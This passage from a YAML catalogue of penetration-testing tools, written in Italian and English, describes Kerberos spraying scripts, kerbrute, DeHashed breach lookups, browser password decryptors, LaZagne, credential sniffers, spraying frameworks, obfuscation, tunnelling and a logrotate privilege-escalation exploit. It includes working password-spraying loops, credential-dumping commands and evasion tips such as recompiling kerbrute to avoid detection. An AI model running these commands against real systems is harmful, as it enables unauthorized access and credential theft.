    source IP. AS-REQ con encryption type debole (RC4) possono essere flagged. Pattern
    temporali anomali (burst uniform) distinguono da traffico user normale. Mitigazioni
    difensive: pre-auth obbligatoria per tutti account (default in modern AD), monitoring
    4771 events con thresholding, rate limiting firewall-level su 88/tcp-udp, account
    lockout policy strict ma not too aggressive (avoid DOS). Kerbrute detection signature:
    binary precompilato può essere fingerprinted, consider compilation from source
    con customization per evasion in red team operations. Alternative detection: behavioral
    analytics identificano pattern enum anche quando individual requests appear legitimate.</p>"
  best_in: true
  category_path: ["03_Post_Exploitation", "AD_Windows", "Kerberos_ADCS_Relay"]
  notes:

- id: "kerberos-windows-scripts"
  name: "kerberos_windows_scripts"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "toolkit"
  phases: ["03_Post_Exploitation"]
  caps: ["kerberos-cli", "ticket-ops", "linux-ad-integration"]
  repo: "https://github.com/ropnop/kerberos_windows_scripts"
  desc: "Raccolta script bash per interagire con Kerberos AD da Linux (ticket ops,
    realm management) e integration con network tool"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>Set script bash per testare
    credenziali Kerberos parlando direttamente con KDC (UDP/88): velocizza spraying/enum
    evitando overhead SMB/LDAP. Usato in initial access con wordlist curate e attenzione
    account lockout. Scripts forniscono lightweight alternative a complex tool quando
    solo basic Kerberos operations needed.</p><h4 class=\"rt-purple\">Script components</h4><p><strong>kinit
    wrapper:</strong> Simplified Kerberos authentication testing con error handling
    e logging.</p><p><strong>klist parser:</strong> Parse ticket cache per extract
    useful information (principals, expiration, encryption types).</p><p><strong>kdestroy
    automation:</strong> Cleanup script per purge ticket caches dopo testing.</p><p><strong>Realm
    configuration helpers:</strong> Generate krb5.conf entries per target domains.</p><h4
    class=\"rt-green\">Utilizzo tipico</h4><p><strong>Credential testing loop:</strong></p><pre><code>while
    read user; do<br>  echo \"Testing $user\"<br>  echo password | kinit $user@REALM
    2>&1 | grep -v \"Password\"<br>  klist -k && echo \"[+] Valid: $user\" && kdestroy<br>done
    &lt; users.txt</code></pre><p><strong>Batch validation:</strong></p><pre><code>for
    cred in user1:pass1 user2:pass2; do<br>  IFS=':' read -r u p &lt;&lt;&lt; \"$cred\"\
    <br>  echo $p | kinit $u@ACME.LOCAL && echo \"[+] $u:$p\"<br>done</code></pre><h4
    class=\"rt-amber\">Vantaggi approach scriptabile</h4><p><strong>Simplicità:</strong>
    No dependencies oltre kerberos-client standard Linux packages.</p><p><strong>Trasparenza:</strong>
    Shell scripts easily auditable e customizable per specific needs.</p><p><strong>Integration:</strong>
    Easy piping con other tools (grep, awk, sed) per processing results.</p><p><strong>Portabilità:</strong>
    Funziona su qualsiasi Linux distro con MIT Kerberos installed.</p><h4 class=\"\
    rt-red\">Flusso tipico e best practice</h4><p>Specificare realm correttamente
    (uppercase): <code>ACME.LOCAL</code> non <code>acme.local</code>. IP del DC diretto
    per evitare DNS lookup: configurare in /etc/hosts o krb5.conf. Rate-limit conservativo
    essenziale: sleep tra attempts per respect lockout policies. Cleanup ticket cache
    dopo ogni test: <code>kdestroy</code> prevent cache pollution. Error handling
    robusto: distinguish tra account non-existent, password wrong, account locked,
    expired password. Logging output per audit: timestamp ogni attempt con result
    per reporting. Alternative moderne (kerbrute) offer better performance e features,
    ma bash scripts mantengono valore per: learning Kerberos mechanics, custom workflows,
    environments dove installing tools problematic, quick one-off testing senza overhead
    tool installation.</p>"
  best_in: true
  category_path: ["03_Post_Exploitation", "AD_Windows", "Recon_Health"]
  notes:

- id: "kerbrute"
  name: "kerbrute"
  version: "1.0.3"
  icon: "../app/icons/github.svg"
  kind: "tool"
  phases: ["03_Post_Exploitation"]
  caps: ["kerberos-preauth", "user-enum", "spray"]
  repo: "https://github.com/ropnop/kerbrute"
  desc: "Pre-auth bruteforcer/enumerator AD con output pulito e threading, identico
    a kerbrute-win ma entry separata per consistency registry"
  desc_long: "<h4 class=\"rt-blue\">Nota</h4><p>Questa entry è duplicate di kerbrute-linux-amd64
    e kerbrute-win per consistency nel registry. Riferirsi alle descrizioni di quelle
    entry per dettagli completi. Kerbrute è single tool distribuito come binaries
    precompilati per multiple platform (Windows, Linux, macOS). Functionality identica
    across platforms: user enumeration, password spraying, brute force via Kerberos
    pre-authentication.</p><h4 class=\"rt-purple\">Cross-platform availability</h4><p>Kerbrute
    releases includono:</p><ul><li>kerbrute_windows_amd64.exe</li><li>kerbrute_linux_amd64</li><li>kerbrute_darwin_amd64
    (macOS)</li><li>ARM variants per Raspberry Pi, mobile devices</li></ul><p>Choose
    appropriate binary per target platform, usage identical.</p><h4 class=\"rt-green\"\
    >Riferimento rapido comandi</h4><p><code>kerbrute userenum -d domain.local users.txt</code>
    - User enumeration<br><code>kerbrute passwordspray -d domain.local users.txt Password123!</code>
    - Password spraying<br><code>kerbrute bruteuser -d domain.local passwords.txt
    admin</code> - Single user brute (sconsigliato)</p><p>Per documentation completa,
    vedere entry kerbrute-linux-amd64 e kerbrute-win in questo registry.</p>"
  best_in: true
  category_path: ["03_Post_Exploitation", "AD_Windows", "Recon_Health"]
  notes:

- id: "dehashed"
  name: "Dehashed"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "service"
  phases: ["03_Post_Exploitation"]
  caps: ["breach-data", "osint", "credentials-hunting"]
  repo: ""
  desc: "Servizio OSINT per query breach data (email/username/hash/IP) via web/API
    utile per wordlist enrichment e compromission verification"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>DeHashed aggrega dataset breach/leak
    consentendo ricerche su email/username/IP/nome/hash sia da web UI sia via API.
    In pentest e DFIR si usa per verificare esposizioni credenziali, generare wordlist
    mirate e attivare monitor su domini/identità. Requires subscription per API access,
    free tier available con limitations.</p><h4 class=\"rt-purple\">Query capabilities</h4><p><strong>Email
    search:</strong> Trova tutti breach contenenti specific email address, returning
    passwords/hashes associated.</p><p><strong>Username search:</strong> Cross-reference
    username attraverso multiple breaches per identify password reuse patterns.</p><p><strong>Hash
    search:</strong> Reverse lookup per hashes (MD5, SHA1, bcrypt) per find plaintext
    equivalents se cracked in breaches.</p><p><strong>IP search:</strong> Historical
    data associating IP addresses con compromised accounts.</p><p><strong>Domain monitoring:</strong>
    Alert quando new breaches affectano domain-associated emails.</p><h4 class=\"\
    rt-green\">API integration workflow</h4><p><strong>1. Authentication:</strong>
    Obtain API key da account settings.</p><p><strong>2. Query construction:</strong></p><pre><code>curl
    -H \"Authorization: Bearer API_KEY\" \"https://api.dehashed.com/search?query=email:target@company.com\"\
    </code></pre><p><strong>3. Result parsing:</strong> JSON response con entries
    array contenente breach details, passwords, hashes.</p><p><strong>4. Wordlist
    generation:</strong> Extract password fields per create targeted wordlist.</p><p><strong>5.
    Hash cracking:</strong> Submit hashes a hashcat/john su isolated environment se
    etico e authorized.</p><h4 class=\"rt-amber\">Pentest applications</h4><p><strong>Credential
    stuffing preparation:</strong> Identify leaked credentials per target organization,
    test durante authorized assessment.</p><p><strong>Password pattern analysis:</strong>
    Analyze company password patterns da breaches per inform spraying wordlist creation.</p><p><strong>Compromised
    account identification:</strong> During incident response, quickly identify which
    accounts affected by specific breach.</p><p><strong>Executive monitoring:</strong>
    Setup alerts per high-value targets (executives, admins) per immediate notification
    se credentials leaked.</p><h4 class=\"rt-red\">Legal e ethical considerations</h4><p>Attenzione
    Terms of Service: alcuni breach data legally restricted. Usage only for legitimate
    security purposes con proper authorization. Proteggere API keys: treat as sensitive
    credentials, rotate regularly. Downloaded data contenente PII richiede secure
    handling: encryption at rest, limited retention, access controls. Reporting: sanitize
    breach data in final reports, reference breach name/date senza reproducing full
    credential lists. Consider privacy implications: inform affected parties appropriately
    quando breach data discovered impacting organization. DeHashed è investigative
    tool: uso offensivo (credential stuffing attacks) senza authorization costituisce
    unauthorized access. Recommendation: use primariamente per defensive posture assessment
    e incident response versus offensive operations. Alternative free tools: HaveIBeenPwned
    API per breach notification, BreachDirectory per public breach search con limitations.
    DeHashed value proposition: comprehensive database, detailed metadata, API automation
    capability per large-scale assessments.</p>"
  best_in: true
  category_path: ["03_Post_Exploitation", "Credentials", "Credentials_Hunting"]
  notes:

- id: "dehashed-py"
  name: "dehashed.py"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "tool"
  phases: ["03_Post_Exploitation"]
  caps: ["dehashed-api", "csv-export", "query-automation"]
  repo: ""
  desc: "Client Python per DeHashed API con CSV export e query automation per enrichment
    OSINT e breach correlation in pipeline"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>Wrapper/utility Python per DeHashed
    API: accetta chiave/email, esegue query (dominio, email, username, hash) e serializza
    output (CSV/JSON) per analisi e correlazioni. Usato in OSINT automation e DFIR
    per arricchire IOC con breach records. Facilitates integration DeHashed in security
    workflows e pipelines.</p><h4 class=\"rt-purple\">Funzionalità wrapper</h4><p><strong>Authentication
    handling:</strong> Manages API key authentication automatically, supports environment
    variables per secure credential storage.</p><p><strong>Query abstraction:</strong>
    Simplified query interface nascondendo API endpoint complexity.</p><p><strong>Rate
    limiting:</strong> Built-in respect per API rate limits per avoid quota exhaustion.</p><p><strong>Output
    formatting:</strong> Export results in CSV, JSON, o custom formats per downstream
    processing.</p><p><strong>Batch processing:</strong> Support per multiple query
    execution con aggregated results.</p><h4 class=\"rt-green\">Utilizzo tipico</h4><p><strong>Single
    email query:</strong></p><pre><code>python dehashed.py --email target@company.com
    --output results.csv</code></pre><p><strong>Domain-wide search:</strong></p><pre><code>python
    dehashed.py --domain company.com --format json -o company-breaches.json</code></pre><p><strong>Batch
    email list:</strong></p><pre><code>python dehashed.py --email-file employees.txt
    --output batch-results.csv</code></pre><p><strong>Hash lookup:</strong></p><pre><code>python
    dehashed.py --hash 5f4dcc3b5aa765d61d8327deb882cf99 --output hash-results.txt</code></pre><h4
    class=\"rt-amber\">Integration in security pipelines</h4><p><strong>Threat intelligence
    enrichment:</strong> Correlate IOCs (email addresses, usernames) con known breaches
    per context.</p><p><strong>Incident response automation:</strong> Rapid lookup
    di compromised credentials durante active incident investigation.</p><p><strong>Continuous
    monitoring:</strong> Scheduled scans per executive/admin account monitoring con
    alerting.</p><p><strong>Penetration testing:</strong> Pre-engagement recon per
    identify leaked credentials facilitating initial access.</p><h4 class=\"rt-red\"\
    >Best practice e compliance</h4><p>Paginare richieste per large result sets: avoid
    single massive query che exhaust quota. Rispettare rate limits: implement exponential
    backoff se 429 responses received. Sanificare output PII: mask o redact sensitive
    fields prima storage/distribution. Versionare risultati con timestamp: breach
    data evolves, historical snapshots valuable. Limitare diffusione interna: access
    breach data on need-to-know basis. Integration con cracking pipeline solo in ambienti
    segregati: ethical considerations paramount. Alternative approach: use dehashed.py
    per identification only, manual validation per actual credential testing authorization.
    Tool è facilitator: operator responsibility ensure lawful ethical usage. Configuration
    management: store API credentials in secure vaults (Hashicorp Vault, AWS Secrets
    Manager) not hardcoded in scripts. Logging: comprehensive audit trail di queries
    executed, results obtained, actions taken based su findings per compliance e incident
    review.</p>"
  best_in: true
  category_path: ["03_Post_Exploitation", "Credentials", "Credentials_Hunting"]
  notes:

- id: "firefox-decrypt-main"
  name: "firefox_decrypt-main"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "tool"
  phases: ["03_Post_Exploitation"]
  caps: ["firefox-secrets", "password-decrypt", "nss"]
  repo: "https://github.com/unode/firefox_decrypt"
  desc: "Tool per estrarre e decifrare password da profili Firefox/derivati con NSS
    library support e override path per discovery fallimenti"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>firefox_decrypt estrae e decifra
    credenziali profili Mozilla usando NSS libraries; permette definire NSS_LIB_PATH
    se auto-discovery fallisce. Usato in credential access post-exploitation e forensics
    su profili locali acquisiti. Supports Firefox, Thunderbird, SeaMonkey e altri
    Mozilla-based applications.</p><h4 class=\"rt-purple\">Meccanica decryption</h4><p><strong>Profile
    location:</strong> Firefox stores encrypted credentials in logins.json (newer)
    o signons.sqlite (older) dentro profile directory.</p><p><strong>Master password:</strong>
    Se configured, master password required per decrypt stored credentials. Tool prompts
    per master password o accepts via command line.</p><p><strong>NSS library dependency:</strong>
    Mozilla Network Security Services library necessary per decryption. Auto-detected
    su most systems, manual path specification available se needed.</p><h4 class=\"\
    rt-green\">Utilizzo</h4><p><strong>Auto-detect profile:</strong></p><pre><code>python
    firefox_decrypt.py</code><br>Searches standard profile locations, lists available
    profiles per selection.</p><p><strong>Specific profile path:</strong><br><code>python
    firefox_decrypt.py /path/to/profile.default</code></pre><p><strong>Export to CSV:</strong></p><pre><code>python
    firefox_decrypt.py --csv --output credentials.csv ~/.mozilla/firefox/profile.default</code></pre><p><strong>Non-interactive
    (no master password):</strong></p><pre><code>python firefox_decrypt.py --no-interactive
    profile</code></pre><p><strong>Custom NSS library:</strong></p><pre><code>NSS_LIB_PATH=/custom/path
    python firefox_decrypt.py profile</code></pre><h4 class=\"rt-amber\">Forensics
    e IR workflow</h4><p><strong>1. Profile acquisition:</strong> Copy Firefox profile
    directory da target system (live acquisition o disk image).</p><p><strong>2. Integrity
    preservation:</strong> Hash profile files prima analysis per chain of custody.</p><p><strong>3.
    Decryption attempt:</strong> Run firefox_decrypt, providing master password se
    known o attempting common passwords.</p><p><strong>4. Credential analysis:</strong>
    Parse output per identify relevant accounts (corporate SSO, admin portals, VPN).</p><p><strong>5.
    Documentation:</strong> Record extracted credentials per incident timeline reconstruction.</p><h4
    class=\"rt-red\">Legal e operational considerations</h4><p>Catene custodia essenziali:
    document profile source, acquisition method, analysis timestamp. Master password
    bruteforce typically impractical: strong passwords + key derivation make cracking
    infeasible. Focus su profiles senza master password o known weak passwords. Output
    handling sensitive: extracted credentials potentially grant access a critical
    systems, secure storage mandatory. Post-exploitation use: dopo compromising host,
    firefox_decrypt rapidamente harvest stored credentials per lateral movement. Alternative
    approach: live memory acquisition può capture master password se Firefox running,
    enabling decryption senza brute-forcing. Cross-platform compatibility: tool funziona
    su Linux, Windows, macOS dato appropriate NSS library available. Derived browsers
    (Waterfox, LibreWolf) use same storage format: firefox_decrypt compatible. Reporting:
    sanitize actual passwords in final reports, document credential existence e associated
    URLs/services senza full credential disclosure. Tool è investigation aid: operator
    ensures lawful authorized access a profiles analyzed.</p>"
  best_in: true
  category_path: ["03_Post_Exploitation", "Credentials", "Credentials_Hunting"]
  notes:

- id: "lazagne-2-4-7"
  name: "LaZagne"
  version: "2.4.7"
  icon: "../app/icons/github.svg"
  kind: "tool"
  phases: ["03_Post_Exploitation"]
  caps: ["credential-recovery", "browser-mail-vaults", "windows"]
  repo: "https://github.com/AlessandroZ/LaZagne"
  desc: "Estrae password e segreti da applicazioni locali (Windows/Linux/macOS): browser,
    mail, wifi, database ecc."
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>LaZagne è un tool multi‑piattaforma
    per il credential dumping da software installati (browser, client mail, messenger,
    database, wifi). Esegue moduli specifici per ciascuna applicazione recuperando
    credenziali salvate e chiavi.</p><h4 class=\"rt-blue\">Funzioni chiave</h4><ul><li>Numerosi
    moduli per applicazioni comuni (Chrome/Firefox, Outlook/Thunderbird, SQL, Wi‑Fi).</li><li>Opzioni
    per output JSON/CSV e modalità silenziosa.</li><li>Esecuzione portabile; binari
    precompilati.</li></ul><h4 class=\"rt-blue\">Uso e OPSEC</h4><p>Limitare la raccolta
    a ciò che serve e proteggere l’output con cifratura/trasporto sicuro. Richiede
    contesto locale dell’utente.</p>"
  best_in: true
  category_path: ["03_Post_Exploitation", "Credentials", "Credentials_Hunting"]
  notes:

- id: "mailsniper"
  name: "MailSniper"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "tool"
  phases: ["03_Post_Exploitation"]
  caps: ["exchange-search", "ews", "o365", "keyword-hunt"]
  repo: "https://github.com/dafthack/MailSniper"
  desc: "Sfrutta e enumera ambienti Exchange/Office 365: autodiscover, OWA/EWS, ricerca
    inbox, spraying e relaying."
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>MailSniper è una toolkit PowerShell
    per attività offensive su Exchange/Office 365: discovery di servizi, password
    spraying, ricerca di dati sensibili via EWS e test di deleghe/inoltri.</p><h4
    class=\"rt-blue\">Funzioni chiave</h4><ul><li>Autodiscover e validazione credenziali
    su OWA/EWS/ActiveSync.</li><li>Search in mailbox (EWS) e enumerazione utenti/indirizzi.</li><li>Controlli
    su MFA/IMAP/SMTP e supporto password spraying con safe‑timers.</li></ul><h4 class=\"\
    rt-blue\">Uso e OPSEC</h4><p>Regolare rate‑limit e sleep per evitare lockout.
    Usare scopi strettamente autorizzati su tenant test.</p>"
  best_in: true
  category_path: ["03_Post_Exploitation", "Credentials", "Credentials_Hunting"]
  notes:

- id: "net-creds"
  name: "net-creds"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "tool"
  phases: ["03_Post_Exploitation"]
  caps: ["pcap-live-sniff", "creds-extract", "protocol-auto"]
  repo: "https://github.com/DanMcInerney/net-creds"
  desc: "Sniffer di credenziali da Live capture/PCAP (HTTP Basic/NTLM, Kerberos, IMAP/POP/SMTP,
    FTP, SNMP, carte)."
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>net-creds estrae credenziali
    e token da traffico in chiaro o autenticazioni deboli. Supporta parsing live o
    da PCAP, riconoscendo protocolli comuni per ottenere hash/secret utili a cracking
    e lateral movement.</p><h4 class=\"rt-blue\">Funzioni chiave</h4><ul><li>Supporto
    per NTLMv1/v2, Kerberos AS‑REQ, HTTP Basic, POP/IMAP/SMTP, FTP, SNMP.</li><li>Output
    in formato compatibile con Hashcat; logging su file.</li><li>Modalità live su
    interfaccia o offline da PCAP.</li></ul><h4 class=\"rt-blue\">Uso e OPSEC</h4><p>Catturare
    solo quanto autorizzato e minimizzare il dwell time. Preferire filtri BPF per
    ridurre il rumore.</p>"
  best_in: true
  category_path: ["03_Post_Exploitation", "Credentials", "Credentials_Hunting"]
  notes:

- id: "pcredz"
  name: "PCredz"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "tool"
  phases: ["03_Post_Exploitation"]
  caps: ["pcap-parse", "ntlm-kerberos", "creds-extract"]
  repo: "https://github.com/lgandx/PCredz"
  desc: "Estrae credenziali/hash da PCAP o interfacce live (NTLM, Kerberos, HTTP,
    IMAP/POP/SMTP, FTP, SNMP)."
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>PCredz analizza traffico per
    individuare e salvare credenziali e hash in formati compatibili con cracking.
    Supporta numerosi protocolli enterprise e logging strutturato per sessione.</p><h4
    class=\"rt-blue\">Funzioni chiave</h4><ul><li>Parsing di protocolli comuni IPv4/IPv6.</li><li>Output
    pronto per Hashcat (NTLMv1/v2, Kerberos etype23).</li><li>Modalità Docker e script
    Python standalone.</li></ul><h4 class=\"rt-blue\">Uso e OPSEC</h4><p>Applicare
    filtri BPF e conservare i log in modo sicuro. Solo su reti/catture autorizzate.</p>"
  best_in: true
  category_path: ["03_Post_Exploitation", "Credentials", "Credentials_Hunting"]
  notes:

- id: "credking"
  name: "CredKing"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "tool"
  phases: ["03_Post_Exploitation"]
  caps: ["password-spraying", "aws-lambda", "ip-rotation"]
  repo: "https://github.com/ustayready/CredKing"
  desc: "Password spraying su più protocolli con rotazione proxy e gestione lockout;
    supporta O365/ADFS/Okta e simili."
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>CredKing è un framework di password
    spraying multi‑servizio orientato all’OPSEC. Gestisce window temporali, sleep,
    proxy, e verifica MFA, con moduli per provider SaaS e identity comuni.</p><h4
    class=\"rt-blue\">Funzioni chiave</h4><ul><li>Moduli per O365/Okta/ADFS e app
    web comuni.</li><li>Rotazione IP/proxy, jitter e safe‑timers per evitare lockouts.</li><li>Report
    degli account validati e stati MFA.</li></ul><h4 class=\"rt-blue\">Uso e OPSEC</h4><p>Applicare
    sleep/cohorting, rispettare policy del cliente e limitare tentativi per utente.</p>"
  best_in: true
  category_path: ["03_Post_Exploitation", "Credentials", "Passwords_Cracking"]
  notes:

- id: "decrypt-chrome-passwords-main"
  name: "decrypt-chrome-passwords"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "tool"
  phases: ["03_Post_Exploitation"]
  caps: ["chrome-secrets", "password-decrypt", "windows"]
  repo: "https://github.com/ohyicong/decrypt-chrome-passwords"
  desc: "Estrae e decritta le password salvate in Chrome (Windows) usando DPAPI e
    il profilo locale."
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>Script Python per leggere il
    database Login Data di Chrome su Windows, ricavare la master key dal Local State
    e decifrare le credenziali salvate tramite DPAPI.</p><h4 class=\"rt-blue\">Funzioni
    chiave</h4><ul><li>Accesso a SQLite Login Data e Local State.</li><li>Decrittazione
    con DPAPI/CryptUnprotectData.</li><li>Esportazione in CSV/STDOUT per uso operativo.</li></ul><h4
    class=\"rt-blue\">Uso e OPSEC</h4><p>Richiede contesto utente. Conservare gli
    output in modo sicuro e rispettare policy di gestione segreti.</p>"
  best_in: true
  category_path: ["03_Post_Exploitation", "Credentials", "Passwords_Cracking"]
  notes:

- id: "htb-wordlist"
  name: "HTB-wordlist"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "wordlist"
  phases: ["03_Post_Exploitation"]
  caps: ["custom-wordlists", "bruteforce", "enum"]
  repo: ""
  desc: "Selezione di wordlist usate in HackTheBox per enum e bruteforce; alternativa
    ai pacchetti SecLists."
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>Raccolta di wordlist orientate
    alle challenge HTB (usernames, password, percorsi web). Utile per directory busting,
    spraying e fuzzing quando si cercano hit comuni nelle macchine della piattaforma.</p><h4
    class=\"rt-blue\">Funzioni chiave</h4><ul><li>Liste tematiche per web, credenziali,
    subdomini.</li><li>Compatibili con ffuf, gobuster, hydra, wfuzz.</li><li>Complementare
    a OWASP SecLists e raccolte community.</li></ul><h4 class=\"rt-blue\">Uso e OPSEC</h4><p>Valutare
    l’impatto sui rate‑limit. Filtrare e deduplicare per ridurre richieste superflue.</p>"
  best_in: true
  category_path: ["03_Post_Exploitation", "Credentials", "Passwords_Cracking"]
  notes:

- id: "omnispray"
  name: "Omnispray"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "framework"
  phases: ["03_Post_Exploitation"]
  caps: ["modular-spraying", "m365", "generic-idp"]
  repo: "https://github.com/0xZDH/Omnispray"
  desc: "Framework modulare per enumeration e password spraying su servizi enterprise
    con output strutturato."
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>Omnispray automatizza discovery,
    enumerazione e spraying contro più protocolli/IDP. Organizza target e risultati
    in progetto, applicando safe‑timers e reporting per operation a basso rumore.</p><h4
    class=\"rt-blue\">Funzioni chiave</h4><ul><li>Modularità per provider (ADFS, O365,
    Okta, custom web).</li><li>Gestione di rate‑limit, proxy, jitter e finestra lockout.</li><li>Esportazione
    risultati per follow‑up (CSV/JSON).</li></ul><h4 class=\"rt-blue\">Uso e OPSEC</h4><p>Pianificare
    le finestre di spraying e segmentare le liste utenti per conformità alle policy.</p>"
  best_in: true
  category_path: ["03_Post_Exploitation", "Credentials", "Passwords_Cracking"]
  notes:

- id: "statistically-likely-usernames"
  name: "statistically-likely-usernames"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "wordlist"
  phases: ["03_Post_Exploitation"]
  caps: ["username-generation", "corp-patterns"]
  repo: "https://github.com/insidetrust/statistically-likely-usernames"
  desc: "Generatore di username plausibili a partire da nomi reali, frequenze e formati
    aziendali."
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>Crea liste di username con alta
    probabilità di esistenza combinando dataset di nomi/cognomi e pattern comuni (f.last,
    first.last, fmlast). Utile per spraying ed enumerazione iniziale.</p><h4 class=\"\
    rt-blue\">Funzioni chiave</h4><ul><li>Supporto a più formati e regole personalizzabili.</li><li>Normalizzazione
    caratteri e deduplica.</li><li>Integrazione semplice in pipeline CLI.</li></ul><h4
    class=\"rt-blue\">Uso e OPSEC</h4><p>Allineare i formati all’azienda target per
    ridurre il rumore e il footprint durante l’enumerazione.</p>"
  best_in: true
  category_path: ["03_Post_Exploitation", "Credentials", "Passwords_Cracking"]
  notes:

- id: "username-anarchy-0-6"
  name: "username-anarchy"
  version: "0.6"
  icon: "../app/icons/github.svg"
  kind: "tool"
  phases: ["03_Post_Exploitation"]
  caps: ["username-generation", "pattern-rules"]
  repo: "https://github.com/urbanadventurer/username-anarchy"
  desc: "Crea varianti di username da nomi completi con pattern personalizzabili e
    output per spraying."
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>username‑anarchy genera rapidamente
    molteplici pattern di username a partire da nome e cognome (iniziali, separatori,
    leet, numerazioni), producendo wordlist pronte per check/login.</p><h4 class=\"\
    rt-blue\">Funzioni chiave</h4><ul><li>Pattern predefiniti e custom via file di
    regole.</li><li>Filtri per lunghezza, charset e deduplica.</li><li>Output a riga
    singola/CSV per tool downstream.</li></ul><h4 class=\"rt-blue\">Uso e OPSEC</h4><p>Usare
    dataset minimi per evitare liste inutilmente grandi; combinare con OSINT aziendale.</p>"
  best_in: true
  category_path: ["03_Post_Exploitation", "Credentials", "Passwords_Cracking"]
  notes:

- id: "bashfuscator"
  name: "Bashfuscator"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "tool"
  phases: ["03_Post_Exploitation"]
  caps: ["bash-obfuscation", "mutators", "randomization"]
  repo: "https://github.com/Bashfuscator/Bashfuscator"
  desc: "Framework di offuscamento per script Bash: encoder, mutatori e generatori
    polimorfi per bypass basici."
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>Bashfuscator produce varianti
    offuscate di script Bash tramite encoder, compressione, wrapping e tecniche polimorfiche.
    Serve a testare le difese e migliorare il rilevamento lato Blue.</p><h4 class=\"\
    rt-blue\">Funzioni chiave</h4><ul><li>Catene di trasformazioni componibili e plugin.</li><li>Randomizzazione/seed
    per varianti non deterministiche.</li><li>Output portabile con minime dipendenze.</li></ul><h4
    class=\"rt-blue\">Uso e OPSEC</h4><p>Usare su script propri e in ambienti controllati.
    Documentare le trasformazioni per analisi post‑test.</p>"
  best_in: true
  category_path: ["03_Post_Exploitation", "Evasion"]
  notes:

- id: "ligolo-ng"
  name: "Ligolo-ng"
  version: "0.8.2"
  icon: "../app/icons/github.svg"
  kind: "tool"
  phases: ["03_Post_Exploitation"]
  caps: ["reverse-tunnel", "tun-interface", "tcp-tls", "autoroute"]
  repo: "https://github.com/nicocha30/ligolo-ng"
  desc: "Tunneling/reverse SOCKS rapido per pivoting su reti compromesse; agent &
    proxy, supporto UDP/TCP, tun interface e relay."
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>Ligolo-ng è un framework di
    tunneling per il pivoting durante attività Red Team. Fornisce un agent leggero
    e un proxy che instaurano tunnel TCP/UDP, interfaccia TUN e inoltro multilivello
    per attraversare segmentazioni di rete senza installazioni invasive.</p><h4 class=\"\
    rt-blue\">Funzioni chiave</h4><ul><li>Modalità agent/proxy con forward di porte,
    SOCKS5 e interfaccia TUN.</li><li>Supporto TCP e UDP, relay in catena e clientless
    pivoting.</li><li>Instradamento selettivo e ACL; comandi interattivi per creare
    listener/links al volo.</li></ul><h4 class=\"rt-blue\">Uso e OPSEC</h4><p>Pensato
    per operazioni silenziose (no NDIS install), si esegue dal user‑space. Configurare
    filtri e rotte solo per gli obiettivi necessari e preferire TLS/mTLS per proteggere
    i canali.</p>"
  best_in: true
  category_path: ["03_Post_Exploitation", "Pivoting"]
  notes:

- id: "linenum"
  name: "LinEnum"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "tool"
  phases: ["03_Post_Exploitation"]
  caps: ["linux-enum", "privesc-checks", "baseline"]
  repo: "https://github.com/rebootuser/LinEnum"
  desc: "Script di enumerazione privesc su Linux: raccoglie info su kernel, SUID,
    servizi, credenziali e misconfig."
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>LinEnum automatizza la fase
    di ricognizione locale su sistemi Linux, evidenziando vettori comuni di escalation:
    permessi deboli, SUID/SGID pericolosi, credenziali e chiavi, servizi e pacchetti
    vulnerabili.</p><h4 class=\"rt-blue\">Funzioni chiave</h4><ul><li>Check su kernel,
    capabilities, SUID/SGID e sudoers.</li><li>Enumerazione servizi, cron, NFS, PATH,
    writable dirs e credenziali in chiaro.</li><li>Output strutturato per report o
    follow‑up manuale.</li></ul><h4 class=\"rt-blue\">Uso e OPSEC</h4><p>Eseguire
    con output su file per analisi offline. Limitare i check rumorosi in ambienti
    sensibili.</p>"
  best_in: true
  category_path: ["03_Post_Exploitation", "Privilege_Escalation", "Linux"]
  notes:

- id: "logrotten-2-1"
  name: "logrotten"
  version: "2.1"
  icon: "../app/icons/github.svg"
  kind: "exploit"
  phases: ["03_Post_Exploitation"]
  caps: ["logrotate-race", "file-replace", "priv-esc"]
  repo: "https://github.com/whotwagner/logrotten"
  desc: "Exploit di logrotate (race condition) per privesc locale sfruttando file
    controllati dall'utente."
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>logrotten abusa di una race
    condition in logrotate per sostituire file o iniettare contenuto controllato,
    ottenendo esecuzione come root in specifiche configurazioni distribuite.</p><h4
    class=\"rt-blue\">Funzioni chiave</h4><ul><li>Trigger del rotate e sincronia precisa
    sul link symbolico.</li><li>Supporto a vari scenari/config di logrotate.</li><li>PoC
    riproducibile per dimostrare impatto.</li></ul><h4 class=\"rt-blue\">Uso e OPSEC</h4><p>Usare
    in ambienti di test. Richiede condizioni specifiche (permessi/logrotate config
    vulnerabile).</p>"
  best_in: true
  category_path: ["03_Post_Exploitation", "Privilege_Escalation", "Linux"]
  notes:

- id: "one-gadget-1-10-0"
  name: "OneGadget"
  version: "1.10.0"
  icon: "../app/icons/github.svg"
  kind: "tool"
  phases: ["03_Post_Exploitation"]
